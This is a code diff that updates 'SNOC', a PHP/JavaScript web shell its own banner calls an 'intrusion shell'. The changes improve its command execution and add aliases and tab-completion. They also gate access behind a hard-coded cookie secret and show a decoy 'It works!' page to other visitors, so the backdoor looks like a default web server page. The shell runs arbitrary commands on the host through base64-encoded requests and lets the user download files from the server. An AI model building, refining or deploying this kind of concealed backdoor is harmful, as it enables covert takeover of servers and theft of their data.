@@ -114,7 +114,7 @@ function echoFoot()
 				    </div>
 				</div>
 				<div>
-					<iframe src="'.basename(__FILE__).'?f=1" width="600"></iframe>
+					<!--<iframe src="'.basename(__FILE__).'?f=1" width="600"></iframe>-->
 				</div>
 			</body>
 		</html>';
@@ -142,6 +142,7 @@ function echoJS()
 		var displayed = false;					// true when matching commands have already been displayed
 		readPath();						// read commands from path (and add to knownCommands)
 
+		var aliases = {ll:"ls -l",la:"ls -a"}; // predefined aliases
 
 		$("#command").focus();					// Focus the command line with cursor
 		$("#dir").empty().append(current_dir);			// Display current direcory
@@ -157,19 +158,47 @@ function echoJS()
 ' #####  #     # #######  #####  <br />'+                                
 '</pre><br />');
 
-		printShell('<span style="margin-left:185px">Shell is Not an Oil Company</span><br /><br /><br /><br />');
-			
+		printShell('<span style="margin-left:185px">Shell is Not an Oil Company</span><br /><br />');
+	
+		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
+		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
+		"responsible for usage that results in illegal actions. We strongly advise you to use SNOC only for testing and demo "+ 
+		"purposes.<br /><br /></p>");		
+
 		// ------ FIRST SYS INFO
-		$("#command").val("uname -a")
-		runCommand();
-		
+		printShell("Current user/server setup:");
+		postShell("uname -a",function(data) {
+			printShell(data);
+		});
+	
 		// ------ RUN
 		function runCommand(){
 			var command = $("#command").val().trim();	// reads command
 			addToHistory(command);
+			var commandArgs = new Array();
+			var commandName = command; // default, if no arguments
+			if (command.indexOf(" ") != -1) {
+				commandArgs = command.split(" "); // includes command name as first entry
+				commandName = commandArgs[0]; // command name without arguments
+			}
 			
+			// print out command
+			printShell("<br /><span style='color: #46CF4F'>"+current_dir+"></span>&nbsp;"+command);
+
+			// lookup aliases and replace
+			for (var alias in aliases) {
+				if (commandName==alias) {
+					printShell("<br />"+aliases[commandName]);
+					commandName = aliases[commandName];
+					command = commandName;
+					for (var i = 1; i < commandArgs.length; i++) { // re-construct command from new command name and args
+						command = command + " " + commandArgs[i];
+					}
+				}
+			}
+
 			// special commands
-			switch(command) {
+			switch(commandName) {
 				case "clear":
 					$("#out").empty();
 					$("#command").val("");
@@ -180,13 +209,14 @@ function echoJS()
 					$("#command").val("");
 					printHelp();
 				break;
+				case "alias":
+					$("#command").val("");
+					doAlias(commandArgs[1]);
+				break;
 				// TODO: Add new special commands here !
 				case "":break;
 				// Default command
 				default:
-					// print out command
-					printShell("<br /><span style='color: #46CF4F'>"+current_dir+"></span>&nbsp;"+command);
-					
 					// empty the command value
 					$("#command").val("");
 					
@@ -196,14 +226,12 @@ function echoJS()
 					//	-> with 2>&1 (pipes stderr for every command)
 					//	-> return the new current dir
 					var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
-					fullcommand = btoa(fullcommand);	// toBase64
-					$.post("shell.php",{"c":fullcommand},function(data){
+					postShell(fullcommand,function(data){
 						if(command.match(/^download/) != null)
 						{
 							startDownload(command);
 							return;
 						}
-						data = atob(data);	// Base64 decode
 						for(var i=data.length-3;i>0;i--) {
 							if(data[i] == ">")
 								break;
@@ -253,7 +281,7 @@ function echoJS()
 		function startDownload(command)
 		{
 			file = current_dir+"/"+command.substr(8,command.length).trim();
-			window.open("shell.php?d="+btoa(file));
+			window.open("?d="+btoa(file));
 		}
 		
 		// ------ AUTOCOMPLETION
@@ -261,14 +289,14 @@ function echoJS()
 		function autocomplete()
 		{
 			var foundCommands = new Array(); // commands that match the input
-			var input = $("#command").val();;
+			var input = $("#command").val();
 			for (c in knownCommands) {
 				if (knownCommands[c].substring(0,input.length)===input) { // if command starts with input
 					foundCommands.push(knownCommands[c]); // add command
 				}
 			}
 			
-			if (foundCommands.length==1) { // iff exactly one command is found
+			if (foundCommands.length==1) { // if exactly one command is found
 				$("#command").val(foundCommands[0]); // autocomplete
 			} else if (foundCommands.length>1) { // alert if more than one match
 				var len = foundCommands.length;
@@ -289,15 +317,12 @@ function echoJS()
 
 		// read commands from the path and add to known
 		function readPath() {
-			var pathc = btoa("echo $PATH");				// encode base64
-			$.post("shell.php",{"c":pathc},function(data){
-				data = atob(data);				// decode
-				var pathFolders=data.split(":");		// does this work for every Linux?
+			postShell("echo $PATH",function(pathList){
+				var pathFolders=pathList.split(":");		// does this work for every Unix?
 				for (p in pathFolders) {			// read commands from every folder
-					var lsc = btoa("ls "+pathFolders[p]);	// encode base64
-					$.post("shell.php",{"c":lsc},function(cList) {
-						cList = atob(cList);		// decode
-						var commands = cList.split("<br />");
+					var folder = pathFolders[p].replace(/<br\s*\/>/g,''); // strip <br />
+					postShell("ls "+pathFolders[p],function(cList) {
+						var commands = cList.split(/<br\s*\/>/g);
 						for (c in commands) {
 							var command = commands[c].trim();
 							if (!contains(knownCommands,command)) { // do not add duplicates
@@ -307,6 +332,34 @@ function echoJS()
 					});
 				}
 			});
+		}
+
+		// ------ OTHER
+		// helpfile
+		function printHelp(){
+			printShell("<br/><br/><table>"+
+			"<tr><th width=150>Functions</th><th>Usage</th></tr>"+
+			"<tr><td>download [file]</td><td>download [file] from current directory</td></tr>"+
+			"<tr><td>clear</td><td>clear shell prompt</td></tr>"+
+			"</table><br/><br/>");
+		}
+
+		// execute the alias command
+		function doAlias(argument){ // arguments[0] is "alias"
+			printShell("<br />");
+			// no arg: display all aliases
+			if (argument==null) {
+				for (a in aliases) {
+					printShell("alias "+a+"="+aliases[a]+"<br />");
+				}
+			} // arg just alias name: display the alias
+			else if (argument.indexOf("=") == -1) {
+				printShell("alias "+argument+"="+aliases[argument]+"<br />");
+			} else { // define a new alias
+				var parts = argument.split("=");
+				var command = parts[1];
+				aliases[parts[0]] = parts[1];
+			}
 		}
 
 		// ------ GENERAL UTILITY FUNCTIONS
@@ -322,59 +375,63 @@ function echoJS()
 			return false;
 		}
 
+		// post a command to the shell - callback function will be executed with the shell's response as its argument
+		// this takes care of all the encoding and decoding from/to base64!
+		function postShell(command,callback) {
+			var b64 = btoa(command); // encode command
+			$.post("",{"c":b64},function(data) {
+				var decoded = atob(data); // decode result
+				callback(decoded);
+			});
+		}
+
 		// ------ EVENT HANDLERS		
-		$("#command").keyup(function(event){
+		$("#command").keydown(function(event){
+			var returnVal = true;	// some browsers need this return value set to false to prevent default behaviour
 			switch(event.which)
 			{
 				//Enter pressed
 				case 13:
+					event.preventDefault();
 					runCommand();
+					returnVal = false;
 				break;
 				//Arrow down
 				case 38:
+					event.preventDefault();
 					loadHistory(1);
+					returnVal = false;
 				break;
 				//Arrow up
 				case 40:
+					event.preventDefault();
 					loadHistory(0);
+					returnVal = false;
+				break;
+				//Tab
+				case 9:
+					event.preventDefault();	// do not lose focus!
+					if (!displayAll) {				
+						autocomplete();
+					} else if (!displayed) {
+						allCommands();
+					}
+					returnVal = false;		// some browsers may need that in addition to preventDefault()
 				break;
 			}
-			if (event.which!=9) { // unless tab, reset the temporarily found commands
+
+			// unless Tab
+			if (event.which!=9) {
 				displayAll = false;
 				displayed = false;
 				tempFoundCommands = [];
 			}
+
+			return returnVal;
 		});
-
-		// tab (autocompletion) - keydown needed (#command loses focus at keyup)
-		$("#command").keydown(function(event){
-			//Tab key
-			if (event.which==9)
-			{
-				event.preventDefault();	// do not lose focus!
-				if (!displayAll) {				
-					autocomplete();
-				} else if (!displayed) {
-					allCommands();
-				}
-				
-				return false;		// some browsers may need that in addition to preventDefault()
-			}
-		});
-
-
-		// helpfile
-		function printHelp(){
-			printShell("<br/><br/><table>"+
-			"<tr><th width=150>Functions</th><th>Usage</th></tr>"+
-			"<tr><td>download [file]</td><td>download [file] from current directory</td></tr>"+
-			"<tr><td>clear</td><td>clear shell prompt</td></tr>"+
-			"</table><br/><br/>");
-		}
 		
 		// drop down selection
-		$("#selection").click(function(){
-		
+		$("#selection").change(function(){
 			switch($(this).val().trim())
 			{
 				case "2":
@@ -505,6 +562,10 @@ else if(checkFileDownload())
 }
 else
 {
-	echoShell();
+	// Simple Cookie Authentication
+	if($_COOKIE['sca'] && $_COOKIE['sca'] === 'e760dc631f4ec5bc565d62c859b03c04')
+		echoShell();
+	else
+		echo '<h1>It works!</h1>';
 }
 ?>
